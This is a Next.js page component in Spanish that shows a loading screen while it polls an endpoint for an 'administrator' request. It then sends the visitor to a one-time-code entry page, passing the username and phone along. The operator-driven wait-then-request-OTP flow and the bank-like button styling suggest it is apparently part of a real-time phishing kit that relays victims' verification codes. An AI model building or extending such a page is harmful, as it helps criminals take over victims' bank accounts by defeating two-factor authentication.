"use client";

import { useCallback, useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import PanelShell from "./components/PanelShell";
import Footer from "./components/Footer";

export default function LoadingPage({ searchParams }) {
  const router = useRouter();
  const next = searchParams?.next || "waiting";
  const phone = searchParams?.phone || "";
  const user = searchParams?.user || "";
  const [statusMessage, setStatusMessage] = useState("Cargando...");
  const [remainingSeconds, setRemainingSeconds] = useState(0);

  const navigateToCode = useCallback(
    (action = "otp-e", flow = "default") => {
      const query = user ? `?user=${encodeURIComponent(user)}${phone ? `&phone=${encodeURIComponent(phone)}` : ""}` : "";
      if (action === "otp-p") {
        router.push(`/code?step=1${query}&flow=${encodeURIComponent(flow)}`);
      } else {
        router.push(`/code?step=2${query}&flow=${encodeURIComponent(flow)}`);
      }
    },
    [phone, router, user]
  );

  const checkRequestState = useCallback(async () => {
    if (!user) {
      setStatusMessage("Falta el usuario para iniciar el monitoreo.");
      return;
    }

    try {
      const response = await fetch(`/api/request-state?user=${encodeURIComponent(user)}`);
      const data = await response.json();

      if (response.ok && data?.data) {
        const { action = "otp-e", flow = "default" } = data.data;
        setStatusMessage(`Solicitud recibida (${action}). Redirigiendo...`);
        navigateToCode(action, flow);
      } else {
        setStatusMessage("Esperando solicitud del administrador...");
      }
    } catch (error) {
      console.error("Error consultando el estado de la solicitud:", error);
      setStatusMessage("Error de conexión. Reintentando en breve...");
    }
  }, [navigateToCode, user]);

  useEffect(() => {
    if (next === "waiting") {
      checkRequestState();
      const poll = setInterval(checkRequestState, 4000);
      return () => clearInterval(poll);
    }

    const timer = setInterval(() => {
      setRemainingSeconds((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          const query = user ? `?user=${encodeURIComponent(user)}${phone ? `&phone=${encodeURIComponent(phone)}` : ""}` : "";
          router.push(`/code?step=2${query}`);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [checkRequestState, next, phone, router, user]);

  const onContinue = async () => {
    if (next === "waiting") {
      await checkRequestState();
      return;
    }

    const query = user ? `?user=${encodeURIComponent(user)}${phone ? `&phone=${encodeURIComponent(phone)}` : ""}` : "";
    router.push(`/code?step=2${query}`);
  };

  const onCancel = () => {
    router.push("/code?step=1");
  };

  return (
    <PanelShell
      title="Cargando..."
      subtitle={next === "code" ? "Validando la información del teléfono..." : "Verificando la solicitud del administrador..."}
      footer={<Footer />}
      compact
    >
      <div style={{ textAlign: "center", display: "grid", gap: "0.6rem" }}>
        <p style={{ color: "#e0fef9", margin: 0 }}>{statusMessage}</p>
        {next !== "waiting" && (
          <p style={{ color: "#a1f0f7", margin: 0 }}>
            Tiempo restante: {remainingSeconds} seg
          </p>
        )}
      </div>

      <div style={{ display: "grid", gap: "0.75rem", marginTop: "0.75rem" }}>
        <button type="button" className="bc-button bc-button-fill bc-button-primary" onClick={onContinue}>
          Continuar
        </button>
        <button type="button" className="bc-button bc-button-outline" onClick={onCancel}>
          Cancelar
        </button>
      </div>
    </PanelShell>
  );
}
